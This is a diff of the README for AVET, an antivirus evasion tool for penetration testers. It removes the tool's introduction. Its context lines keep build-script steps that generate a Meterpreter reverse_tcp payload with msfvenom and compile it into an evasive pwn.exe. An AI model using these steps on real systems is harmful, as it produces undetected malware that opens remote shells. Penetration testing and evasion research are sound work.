@@ -1,27 +1,3 @@
-AntiVirus Evasion Tool
-======================
-
-AVET is an AntiVirus Evasion Tool, which was developed for making life easier for pentesters and for experimenting with antivirus evasion techniques.
-In version 1.1 lot of stuff was introduced, for a complete overview have a look at the CHANGELOG file. Now 64bit payloads can also be used, for easier usage I hacked a small build tool (avet_fabric.py).
-
-For basics about antivirus evasion have a look at my old article: 
-https://govolutionde.files.wordpress.com/2014/05/avevasion_pentestmag.pdf
-and my Deepsec presentation: 
-https://deepsec.net/docs/Slides/2014/Why_Antivirus_Fails_-_Daniel_Sauder.pdf
-
-What & Why:
-- when running an exe file made with msfpayload & co, the exe file will often be recognized by the antivirus software
-- avet is a antivirus evasion tool targeting windows machines with executable files
-- assembly shellcodes can be used
-- make_avet can be used for configuring the sourcecode
-- with make_avet you can load ASCII encoded shellcodes from a textfile or from a webserver, further it is using an av evasion technique to avoid sandboxing and emulation
-- for ASCII encoding the shellcode the tool format.sh and sh_format are included
-- this readme applies for Kali 2 (64bit) and tdm-gcc
-
-How to install tdm-gcc with wine:
-https://govolution.wordpress.com/2017/02/04/using-tdm-gcc-with-kali-2/
-
-
 How to use make_avet and build scripts
 --------------------------------------
 Compile if needed:
@@ -220,15 +196,3 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.116.132 lport=443 
 ./make_avet -f scclean.txt -X -E
 $win64_compiler -o pwn.exe avet.c
 rm scclean.txt && echo "" > defs.h
-
-Press enter to continue.
-
-Building the output file...
-
-Please stand by...
-
-The output file should be placed in the current directory.
-
-Bye...
-```
-
